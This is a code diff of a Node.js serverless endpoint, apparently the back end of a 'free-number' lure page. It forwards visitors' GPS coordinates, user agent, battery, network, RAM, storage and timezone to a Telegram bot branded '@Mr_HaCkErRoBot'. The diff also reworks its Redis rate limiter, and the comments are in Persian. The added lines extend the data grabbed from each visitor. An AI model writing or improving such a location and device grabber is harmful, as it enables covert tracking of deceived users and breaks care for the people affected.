@@ -1,36 +1,31 @@
 const fetch = require('node-fetch');
-const FormData = require('form-data');
 const formidable = require('formidable');
 
 const REDIS_URL = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
+const TTL_SECONDS = 15 * 60;
 
-async function getRedisValue(key) {
-  const res = await fetch(`${REDIS_URL}/get/${key}`, {
-    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
-  });
-  const data = await res.json();
-  return data.result;
-}
-
-async function incrementRedisKey(key, ttlSeconds = 900) {
-  await fetch(`${REDIS_URL}/set/${key}/EX/${ttlSeconds}/NX`, {
-    method: 'POST',
-    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
-  });
-
+async function redisIncrWithTTL(key) {
   const res = await fetch(`${REDIS_URL}/incr/${key}`, {
     method: 'POST',
     headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
   });
-
   const data = await res.json();
-  return parseInt(data.result);
+  const count = parseInt(data.result);
+
+  if (count === 1) {
+    await fetch(`${REDIS_URL}/expire/${key}/${TTL_SECONDS}`, {
+      method: 'POST',
+      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
+    });
+  }
+
+  return count;
 }
 
 module.exports = async (req, res) => {
   const botToken = process.env.TOKEN;
-  const allowedOrigin = 'https://free-number1.vercel.app'; // ← دامنه واقعی خودت رو وارد کن
+  const allowedOrigin = 'https://free-number1.vercel.app'; // ← دامنه‌ات
 
   if (req.headers.origin && req.headers.origin !== allowedOrigin) {
     return res.status(403).json({ ok: false, error: 'Invalid origin' });
@@ -66,39 +61,53 @@ module.exports = async (req, res) => {
       return res.status(400).json({ ok: false, error: 'Missing required parameters.' });
     }
 
-    // ✅ بررسی لیمیت IP
     const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-    const redisKey = `rate_limit:${ip}`;
+    const redisKey = `limit:${ip}`;
 
     try {
-      const currentCount = await incrementRedisKey(redisKey);
+      const count = await redisIncrWithTTL(redisKey);
 
-      if (currentCount > 10) {
-        return res.status(429).json({
+      if (count > 10) {
+        return res.status(200).json({
           ok: false,
-          error: '⛔ شما به محدودیت ۱۰ بار در ۱۵ دقیقه رسیده‌اید. لطفاً بعداً دوباره تلاش کنید.'
+          limited: true,
+          error: '⛔ ارسال اطلاعات به ربات متوقف شد. شما به محدودیت ۱۵ دقیقه‌ای رسیده‌اید.'
         });
       }
 
-      // ارسال به تلگرام
       const now = new Date();
       const dateTime = now.toLocaleString();
 
-      const messageText = `📍 Latitude: ${latitude}\n📍 Longitude: ${longitude}\n📅 Date: ${dateTime}\n🌍 Timezone: ${timezone}\n📶 Network: ${networkType}\n🔋 Battery: ${batteryLevel}% (${batteryCharging === 'true' ? 'Charging' : 'Not Charging'})`;
+      const messageText = `*╭┈┈┈┈┈┈┈┈┈┈┈┈┈╮\n⚡Powered by :- @Mr_HaCkErRoBot\n╰┈┈┈┈┈┈┈┈┈┈┈┈┈╯*\n\n` +
+        `*📌 New Data Received:*\n\n` +
+        `*📍 Latitude:* ${latitude}\n` +
+        `*📍 Longitude:* ${longitude}\n` +
+        `*📱 User Agent:* ${userAgent || 'Unknown'}\n` +
+        `*📅 Date:* ${dateTime}\n` +
+        `*🌍 Timezone:* ${timezone || 'Unknown'}\n` +
+        `*🔋 Battery:* ${batteryLevel || 'Unknown'}% (${batteryCharging === 'true' ? 'Charging' : 'Not Charging'})\n` +
+        `*📶 Network:* ${networkType || 'Unknown'} (${networkSpeed || 'Unknown'} Mbps)\n` +
+        `*📞 Selected Number:* User Denied\n` +
+        `*🌐 Country Code:* ${countryCode || 'Unknown'}\n` +
+        `*💾 RAM:* ${ram || 'Unknown'} GB\n` +
+        `*💽 Storage:* ${storage || 'Unknown'}\n` +
+        `*🔒 Permission:* Denied`;
 
+      // ارسال لوکیشن
       await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         body: new URLSearchParams({ chat_id: chatId, latitude, longitude })
       });
 
+      // ارسال پیام کامل
       await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: new URLSearchParams({ chat_id: chatId, text: messageText })
+        body: new URLSearchParams({ chat_id: chatId, text: messageText, parse_mode: 'Markdown' })
       });
 
-      return res.status(200).json({ ok: true });
+      return res.status(200).json({ ok: true, sent: true });
     } catch (error) {
       return res.status(500).json({ ok: false, error: 'Server error: ' + error.message });
     }
